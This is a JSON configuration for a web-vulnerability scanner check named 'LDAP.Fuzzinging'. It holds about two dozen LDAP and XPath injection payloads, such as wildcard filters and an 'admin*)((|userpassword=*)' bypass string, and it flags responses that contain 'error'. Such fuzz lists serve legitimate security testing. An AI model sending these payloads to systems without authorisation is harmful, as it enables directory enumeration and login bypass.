[
 {
  "Name": "LDAP.Fuzzinging", 
  "Active": false, 
  "Scanner": 1, 
  "Payloads": [
   "!", 
   "%21", 
   "%26", 
   "%27", 
   "%27", 
   "%28", 
   "%29", 
   "%2A%28%7C%28mail%3D%2A%29%29", 
   "%2A%28%7C%28objectclass%3D%2A%29%29", 
   "%2A%7C", 
   "%7C", 
   "&", 
   "(", 
   ")", 
   "*(|(mail=*))", 
   "*(|(objectclass=*))", 
   "*/*", 
   "*|", 
   "/", 
   "//", 
   "//*", 
   "@*", 
   "x' or name()='username' or 'x'='y", 
   "|", 
   "*()|&'", 
   "admin*", 
   "admin*)((|userpassword=*)", 
   "*)(uid=*))(|(uid=*"
  ], 
  "Encoder": [], 
  "UrlEncode": false, 
  "CharsToUrlEncode": "", 
  "Grep": [
   "error"
  ], 
  "PayloadResponse": false, 
  "NotResponse": false, 
  "NotCookie": false, 
  "TimeOut": 0, 
  "isTime": false, 
  "CaseSensitive": false, 
  "isReplace": false, 
  "ExcludeHTTP": false, 
  "OnlyHTTP": false, 
  "IsContentType": false, 
  "ContentType": "", 
  "NegativeCT": false, 
  "IsResponseCode": false, 
  "ResponseCode": "", 
  "NegativeRC": false, 
  "MatchType": 1, 
  "RedirType": 0, 
  "MaxRedir": 0, 
  "rCookies": false, 
  "spaceEncode": false, 
  "payloadPosition": 0, 
  "IssueName": "LDAP.Fuzzinging", 
  "IssueSeverity": "Information", 
  "IssueConfidence": "Certain", 
  "IssueDetail": "LDAP.Fuzzinging\n\n<grep>", 
  "RemediationDetail": "", 
  "IssueBackground": "", 
  "RemediationBackground": ""
 }
]